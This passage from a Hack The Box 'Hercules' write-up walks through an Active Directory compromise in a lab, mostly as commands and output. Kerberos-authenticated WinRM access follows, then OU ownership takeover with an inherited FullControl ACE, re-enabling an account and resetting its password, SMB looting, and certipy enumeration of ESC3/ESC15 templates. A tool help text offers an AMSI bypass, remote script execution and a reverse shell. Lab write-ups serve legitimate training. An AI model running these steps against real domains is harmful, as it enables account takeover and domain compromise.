Going back to the initial `rustscan` results, port 5985 for WinRM wasn't exposed. Port 5986, which is WinRM + SSL, was the one exposed.

Trying to connect over Kerberos with SSL using `evil-winrm`, we hit an error saying we need to specify the username. We add the flag, but even with a username and NTLM hash `evil-winrm` won't let us authenticate over WinRM in SSL; the process always fails.

```powershell
❯ evil-winrm -i DC.hercules.htb -r hercules.htb --ssl
/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/winrm-2.3.9/lib/winrm/connection_opts.rb:73:in `validate_required_fields': user is a required option (RuntimeError)
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/winrm-2.3.9/lib/winrm/connection_opts.rb:61:in `validate'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/winrm-2.3.9/lib/winrm/connection_opts.rb:32:in `create_with_defaults'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/winrm-2.3.9/lib/winrm/connection.rb:64:in `configure_connection_opts'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/winrm-2.3.9/lib/winrm/connection.rb:27:in `initialize'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/evil-winrm.rb:337:in `new'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/evil-winrm.rb:337:in `connection_initialization'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/evil-winrm.rb:541:in `main'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/evil-winrm.rb:1227:in `<top (required)>'
	from <internal:/usr/local/rvm/rubies/ruby-3.1.2/lib/ruby/3.1.0/rubygems/core_ext/kernel_require.rb>:85:in `require'
	from <internal:/usr/local/rvm/rubies/ruby-3.1.2/lib/ruby/3.1.0/rubygems/core_ext/kernel_require.rb>:85:in `require'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/gems/evil-winrm-3.7/bin/evil-winrm:3:in `<top (required)>'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/gems/evil-winrm-3.7/bin/evil-winrm:25:in `load'
	from /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/bin/evil-winrm:25:in `<main>'
```

Doing some research for alternatives, we come across the GitHub repo github.com/ozelis/winrmexec. Following the `winrmexec` help guide, we find that to connect over SSL with Kerberos auth we should use the following command.

We confirm we finally get in because `auditor` is part of the `REMOTE MANAGEMENT USERS` group. We get access to `DC.hercules.htb` and finally grab the `user.txt` flag.

```powershell
❯ winrmexec.py -k -no-pass 'dc.hercules.htb' -dc-ip $IP -ssl -port 5986
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] '-target_ip' not specified, using dc.hercules.htb
[*] '-url' not specified, using https://dc.hercules.htb:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\auditor
[*] '-spn' not specified, using HTTP/dc.hercules.htb@HERCULES.HTB
[*] requesting TGS for HTTP/dc.hercules.htb@HERCULES.HTB
PS C:\Users\auditor\Documents> type ../Desktop/user.txt
baa4d3b25e36dc8943444e9ca8ce8a46
```

We can also use the `evil_winrmexec.py` tool that comes with that same GitHub repo.

```powershell
❯ evil_winrmexec.py DC.hercules.htb -dc-ip $IP -target-ip $IP -port 5986 -ssl -k -no-pass
[*] '-url' not specified, using https://10.129.145.12:5986/wsman
[*] using domain and username from ccache: HERCULES.HTB\auditor
[*] '-spn' not specified, using HTTP/DC.hercules.htb@HERCULES.HTB
[*] requesting TGS for HTTP/DC.hercules.htb@HERCULES.HTB

Ctrl+D to exit, Ctrl+C will try to interrupt the running pipeline gracefully
This is not an interactive shell! If you need to run programs that expect
inputs from stdin, or exploits that spawn cmd.exe, etc., pop a !revshell

Special !bangs:
  !download RPATH [LPATH]          # downloads a file or directory (as a zip file); use 'PATH'
                                   # if it contains whitespace

  !upload [-xor] LPATH [RPATH]     # uploads a file; use 'PATH' if it contains whitespace, though use iwr
                                   # if you can reach your ip from the box, because this can be slow;
                                   # use -xor only in conjunction with !psrun/!netrun

  !amsi                            # amsi bypass, run this right after you get a prompt

  !psrun [-xor] URL                # run .ps1 script from url; uses ScriptBlock smuggling, so no !amsi patching is
                                   # needed unless that script tries to load a .NET assembly; if you can't reach
                                   # your ip, !upload with -xor first, then !psrun -xor 'c:\foo\bar.ps1' (needs absolute path)

  !netrun [-xor] URL [ARG] [ARG]   # run .NET assembly from url, use 'ARG' if it contains whitespace;
                                   # !amsi first if you're getting '...program with an incorrect format' errors;
                                   # if you can't reach your ip, !upload with -xor first then !netrun -xor 'c:\foo\bar.exe' (needs absolute path)

  !revshell IP PORT                # pop a revshell at IP:PORT with stdin/out/err redirected through a socket; if you can't reach your ip and you
                                   # you need to run an executable that expects input, try:
                                   # PS> Set-Content -Encoding ASCII 'stdin.txt' "line1`nline2`nline3"
                                   # PS> Start-Process some.exe -RedirectStandardInput 'stdin.txt' -RedirectStandardOutput 'stdout.txt'

  !log                             # start logging output to winrmexec_[timestamp]_stdout.log
  !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\auditor\Documents>
```

---

## Auth as fernando.r

### BloodHound Enumeration again to view new attack paths

Using `auditor`'s TGT (`.ccache`) in our `KRB5CCNAME` variable, we'll fire up the `rusthound-ce` collector again to see whether we have more access to enumerate the domain.

It's totally normal for a user to be able to see and enumerate the domain to a certain point, and for another user to have more permissions and net us more info and attack vectors. We'll upload these new JSONs into `BloodHound CE`.

```bash
❯ rusthound-ce -d hercules.htb -u 'auditor' -k -f DC.hercules.htb -i $IP -c All -z --ldaps
---------------------------------------------------
Initializing RustHound-CE at 06:21:38 on 10/21/25
Powered by @g0h4n_0
Special thanks to NH-RED-TEAM
---------------------------------------------------

[2025-10-21T04:21:38Z INFO  rusthound_ce] Verbosity level: Info
[2025-10-21T04:21:38Z INFO  rusthound_ce] Collection method: All
[2025-10-21T04:21:50Z INFO  rusthound_ce::ldap] Connected to HERCULES.HTB Active Directory!
[2025-10-21T04:21:50Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-10-21T04:21:50Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T04:21:51Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=hercules,DC=htb
[2025-10-21T04:21:51Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T04:21:52Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=hercules,DC=htb
[2025-10-21T04:21:52Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T04:21:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=hercules,DC=htb
[2025-10-21T04:21:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T04:21:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=hercules,DC=htb
[2025-10-21T04:21:53Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-10-21T04:21:53Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=hercules,DC=htb
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
⢀ Parsing LDAP objects: 22%                                                                                                                                                                                                              [2025-10-21T04:21:53Z INFO  rusthound_ce::objects::enterpriseca] Found 18 enabled certificate templates
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 50 users parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 70 groups parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 6 computers parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 74 containers parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 1 ntauthstores parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 1 aiacas parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 1 rootcas parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 1 enterprisecas parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 34 certtemplates parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] 3 issuancepolicies parsed!
[2025-10-21T04:21:53Z INFO  rusthound_ce::json::maker::common] .//20251021062153_hercules-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 06:21:53 on 10/21/25! Happy Graphing!
```

Going over `auditor`'s permissions, we find he's a member of `FOREST MANAGEMENT`, whose members have `GenericAll` over the OU called `FOREST MIGRATION`.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021063315.png)

Inside that OU, we find several users that might have more permissions over the domain.

Having `GenericAll` over an OU, we can grant ourselves this same ACE over the child objects inside that unit. So at first glance we could get full control over all of these users.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021063334.png)

Going over the permissions on these users sitting in this OU, we find the user `IIS_ADMINISTRATOR` is a member of the `SERVICE OPERATORS` group, whose members have `ForceChangePassword` over several domain users, including `IIS_WEBSERVER$`. For this last one, we already saw in the initial `BloodHound` enumeration that we could do a `Resource-Based Constrained Delegation (RBCD)` over the Domain Controller.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021063355.png)

So we have a clear path we should follow to finally get access as Domain Admins in the `hercules.htb` domain.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021063701.png)

As we mentioned earlier, having `GenericAll` over an `Organizational Unit (OU)` can lead us to gaining the privileges to compromise all the child objects in the container.

The main catch is that this way we can only get full control over non-privileged objects, i.e. those whose `adminCount` isn't True/1. Checking the `IIS_Administrator` user with `bloodyAD` or `BloodHound`, we run into this problem: we couldn't get full control over `IIS_Administrator` because the `FullControl` permissions wouldn't inherit for this user.

> A user with `GenericAll` (and, therefore, `WriteDACL` permissions) over an organizational unit could add a `FullControl` ACE to the OU and specify that this ACE should be inherited, leading to the compromise of all child objects, since they would inherit that ACE.
>
> Via: [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-acl-ace/#organizational-units-acl)
{: .prompt-info }

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'CN=IIS_ADMINISTRATOR,OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' --resolve-sd

distinguishedName: CN=IIS_Administrator,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
adminCount: 1
...[snip]...
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021063840.png)

Going over the rest of the users in the `FOREST MIGRATION` OU, we find one that belongs to an extra group compared to the rest. The user `fernando.r` is a member of the `SMARTCARD OPERATORS` group.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064034.png)

Checking the permissions on `fernando.r`, we find this `SMARTCARD OPERATORS` group can request/enroll more certificates than normal users.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064114.png)

Going over the fastest path to Domain Admins again, at the top we see the `SMARTCARD OPERATORS` group has `ADCSESC3` over the domain, so it looks like there's a vulnerable template and the requirements for `ESC3` are met to exploit the `Active Directory Certificate Services (ADCS)` role.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064231.png)

As we said, `fernando.r` is a member of `SMARTCARD OPERATORS`. These members can request certificates and, according to `BloodHound`, the requirements to pull off the `ADCSESC3` are met.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064323.png)

---
### Abuse of GenericAll privileges on an OU to gain full control of objects

At this point we're under `auditor`'s context, who has `GenericAll` over the `FOREST MIGRATION` OU, where `fernando.r` sits. This user doesn't have the `adminCount` set, so if we grant ourselves `FullControl`, we'd also get it over `fernando.r`.

```bash
❯ bloodyAD --host dc.hercules.htb -d hercules.htb -k get object 'fernando.r' --resolve-sd

distinguishedName: CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
accountExpires: 9999-12-31 23:59:59.999999+00:00
badPasswordTime: 1601-01-01 00:00:00+00:00
badPwdCount: 0
cn: Fernando Rodriguez
...[snip]...
```

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064451.png)

We'll connect as `auditor` with `PowerView.py` and, through `Set-ObjectOwner`, grant ourselves ownership of the `FOREST MIGRATION` OU.

Once we're the owner, we'll grant ourselves the `FullControl` ACE in `Inheritance` mode with `Add-DomainObjectAcl`. The goal is to have full control over all the non-privileged child objects in that unit. We confirm the permissions were added correctly.

```powershell
❯ powerview hercules.htb/auditor@dc.hercules.htb --dc-ip $IP -ns dc.hercules.htb -k --no-pass
Logging directory is set to /root/.powerview/logs/hercules-auditor-dc.hercules.htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Set-ObjectOwner -PrincipalIdentity auditor -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB"
[2025-10-21 06:45:51] [Set-DomainObjectOwner] Changing current owner S-1-5-21-1889966460-2597381952-958560702-512 to S-1-5-21-1889966460-2597381952-958560702-1128
[2025-10-21 06:45:51] [Set-DomainObjectOwner] Success! modified owner for OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb

╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Add-DomainObjectAcl -PrincipalIdentity auditor -Rights FullControl -Inheritance -TargetIdentity "OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB"
[2025-10-21 06:47:35] [Add-DomainObjectACL] Found target identity: OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 06:47:35] [Add-DomainObjectACL] Found principal identity: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 06:47:35] Objects with adminCount=1 will not inherit ACEs from their parent container/OU
[2025-10-21 06:47:35] Adding FullControl to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 06:47:35] [Add-DomainObjectACL] Success! Added ACL to OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
```

----
### Enabling disabled account and setting a new password with PowerView.py

Going over `fernando.r`, we see the user is disabled in the domain. Now that we have full control over the object, we could go ahead and re-enable him.

![image](/assets/img/writeups/htb-hercules/Pasted image 20251021064916.png)

From the same `PowerView.py` session under `auditor`'s context, we'll enable `fernando.r` with `Enable-ADAccount`. Once the user is enabled, we'll reset `fernando.r`'s password. We confirm the account has been enabled and the credential change went through.

```powershell
╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Enable-ADAccount -Identity fernando.r
[2025-10-21 06:49:29] [Set-DomainObject] Success! modified attribute userAccountControl for CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
[2025-10-21 06:49:29] [Enable-ADAccount] Account fernando.r enabled

╭─LDAPS─[dc.hercules.htb]─[HERCULES\auditor]-[NS:<auto>]
╰─PV ❯ Set-DomainUserPassword -Identity fernando.r -AccountPassword Gzzcoo123
[2025-10-21 06:49:49] [Set-DomainUserPassword] Principal CN=Fernando Rodriguez,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb found in domain
[2025-10-21 06:49:49] [Set-DomainUserPassword] Password has been successfully changed for user fernando.r
[2025-10-21 06:49:49] Password changed for fernando.r
```

We'll validate `fernando.r`'s credentials by authenticating to the LDAP service with `NetExec`. We now have valid credentials to act as `hercules\fernando.r`.

```bash
❯ nxc ldap $IP -u 'fernando.r' -p 'Gzzcoo123' -k
LDAP        10.129.145.12   389    DC               [*] None (name:DC) (domain:hercules.htb) (signing:None) (channel binding:Never) (NTLM:False)
LDAP        10.129.145.12   389    DC               [+] hercules.htb\fernando.r:Gzzcoo123 
```

---
## Shell as ashley.b
### SMB Enumeration 

Still with `auditor`'s TGT, we'll enumerate the SMB shares. From the output we have `READ` permission over several shares which we'll enumerate looking for extra info.

Spidering the share called `Department`, we find the following files: `IT/notice.eml` and `IT/cleanup.lnk`.

```bash
❯ nxc smb dc.hercules.htb --use-kcache --shares
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\auditor from ccache 
SMB         dc.hercules.htb 445    dc               [*] Enumerated shares
SMB         dc.hercules.htb 445    dc               Share           Permissions     Remark
SMB         dc.hercules.htb 445    dc               -----           -----------     ------
SMB         dc.hercules.htb 445    dc               ADMIN$                          Remote Admin
SMB         dc.hercules.htb 445    dc               C$                              Default share
SMB         dc.hercules.htb 445    dc               Department      READ            
SMB         dc.hercules.htb 445    dc               IPC$            READ            Remote IPC
SMB         dc.hercules.htb 445    dc               NETLOGON        READ            Logon server share 
SMB         dc.hercules.htb 445    dc               Reports         READ            
SMB         dc.hercules.htb 445    dc               SYSVOL          READ            Logon server share 
SMB         dc.hercules.htb 445    dc               Users           READ            

❯ nxc smb dc.hercules.htb --use-kcache --spider 'Department' --pattern .
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\auditor from ccache 
SMB         dc.hercules.htb 445    dc               [*] Spidering .
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/.. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Engineering Department/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Engineering Department/.. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/IT/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/IT/.. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/IT/cleanup.lnk [lastm:'2024-12-04 02:45' size:1048]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/IT/notice.eml [lastm:'2024-12-04 02:47' size:935]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Recruitment/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Recruitment/.. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Security Department/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Security Department/.. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Web Department/. [dir]
SMB         dc.hercules.htb 445    dc               //dc.hercules.htb/Department/Web Department/.. [dir]
```

Through `NetExec` and the `--get-file` flag, we'll download both files so we have a local copy on our box.

```bash
❯ nxc smb dc.hercules.htb --use-kcache --share 'Department' --get-file 'IT/notice.eml' 'notice.eml'
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\auditor from ccache 
SMB         dc.hercules.htb 445    dc               [*] Copying "IT/notice.eml" to "notice.eml"
SMB         dc.hercules.htb 445    dc               [+] File "IT/notice.eml" was downloaded to "notice.eml"

❯ nxc smb dc.hercules.htb --use-kcache --share 'Department' --get-file 'IT/cleanup.lnk' 'cleanup.lnk'
SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.hercules.htb 445    dc               [+] HERCULES.HTB\auditor from ccache 
SMB         dc.hercules.htb 445    dc               [*] Copying "IT/cleanup.lnk" to "cleanup.lnk"
SMB         dc.hercules.htb 445    dc               [+] File "IT/cleanup.lnk" was downloaded to "cleanup.lnk"
```

The first file, `notice.eml`, holds some interesting info sent by `Ashley Browne` (`ashley.b`), saying the following:

- The administration has provided a solution for the permission issues

- A 3-step procedure has been set up for password resets:

    1. Verify AD permissions against the user
    
    2. Run the shortcut provided in the share
    
    3. Try the password reset again

- If it fails, contact Ashley Browne

```bash
❯ cat notice.eml
--_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
Content-Type: multipart/alternative;
	boundary="_000_MEYP282MB3102AC3E29FED8B2MEYP282MB3102AUSP_"

--_000_MEYP282MB3102AC3E2MEYP282MB3102AUSP_
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
________________________________
From: Ashley Browne
Sent: Tuesday 10:17:27 AM
To: IT Support <HERCULES\IT Support@HERCULES.HTB>
Subject: Password Reset

Hey Team,

The Administration has provided a solution to much of the permission issues=
some of you have been facing.

If you are having problems changing a password, the instructions are:

1) Check AD Permissions against the user.
2) Run the shortcut provided in the share.
3) Try to reset the password again.

If all else fails, send me a message.

Regards, Ashley.

--_000_MEYP282MB3102AC3E21A33MEYP282MB3102AUSP_
Content-Type: text/html; charset="us-ascii"
Content-Transfer-Encoding: quoted-printable
```

On the other hand, the shortcut (`.lnk`) points to a script at `C:\Users\ashley.b\Desktop\aCleanup.ps1`.

```bash
❯ strings cleanup.lnk
/C:\
Users
ashley.b
Desktop
aCleanup.ps1
C:\Users\ashley.b\Desktop\aCleanup.ps1
1SPS
1SPS
```

From the terminal where we're under `auditor`'s context, we can see that on the `C:\` drive there's a directory called `Shares`. Inside we find the share called `Department`, which holds the same two files we got by enumerating SMB.

```powershell
                                                
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----        10/10/2025  12:56 AM                inetpub                                                               
d-----          5/8/2021   6:15 PM                PerfLogs                                                              
d-r---         9/24/2025   3:42 AM                Program Files                                                         
d-----         12/4/2024  11:44 AM                Program Files (x86)                                                   
d-----         12/4/2024  11:45 AM                Shares                                                                
d-r---        10/17/2025  10:28 PM                Users                                                                 
d-----        10/10/2025  12:58 AM                Windows                                                               


PS C:\> ls Shares


    Directory: C:\Shares


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         12/4/2024  11:45 AM                Department                                                            
d-----         12/4/2024  11:45 AM                Users                                                                 


PS C:\> tree /f /a Shares/Department
Folder PATH listing
Volume serial number is 000001CB 0A8A:BD1A
C:\SHARES\DEPARTMENT
+---Engineering Department
+---IT
|       cleanup.lnk
|       notice.eml
|       
+---Recruitment
+---Security Department
\---Web Department
```

--
### Active Directory Certificate Services (ADCS)

We'll request a TGT (Ticket Granting Ticket) for `fernando.r`. Once we get the (`.ccache`), we'll export it in the `KRB5CCNAME` variable and confirm it imported correctly with `klist`.

```bash
❯ getTGT.py hercules.htb/fernando.r:'Gzzcoo123' -dc-ip $IP
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in fernando.r.ccache

❯ export KRB5CCNAME=$(pwd)/fernando.r.ccache

❯ klist
Ticket cache: FILE:/root/Personal/HackTheBox/Labs/Windows/AD/Insane/Hercules/content/fernando.r.ccache
Default principal: fernando.r@HERCULES.HTB

Valid starting       Expires              Service principal
10/21/2025 06:50:44  10/21/2025 16:50:44  krbtgt/HERCULES.HTB@HERCULES.HTB
	renew until 10/22/2025 06:50:44
```

Using `fernando.r`, we'll check for vulnerable templates to find the Template that `BloodHound` flagged for `ADCSESC3`. From the output we find the following info.

In the results, we confirm the requirements to pull off `ESC3` are met, and it also highlights a possible `ESC15`.

```bash
❯ certipy find -u fernando.r@hercules.htb -k -no-pass -dc-ip $IP -dc-host dc -target DC.hercules.htb -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 18 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'CA-HERCULES' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'CA-HERCULES'
[*] Checking web enrollment for CA 'CA-HERCULES' @ 'dc.hercules.htb'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : CA-HERCULES
    DNS Name                            : dc.hercules.htb
    Certificate Subject                 : CN=CA-HERCULES, DC=hercules, DC=htb
    Certificate Serial Number           : 1DD5F287C078F9924ED52E93ADFA1CCB
    Certificate Validity Start          : 2024-12-04 01:34:17+00:00
    Certificate Validity End            : 2034-12-04 01:44:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : HERCULES.HTB\Administrators
      Access Rights
        ManageCa                        : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        ManageCertificates              : HERCULES.HTB\Administrators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Enroll                          : HERCULES.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
  1
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
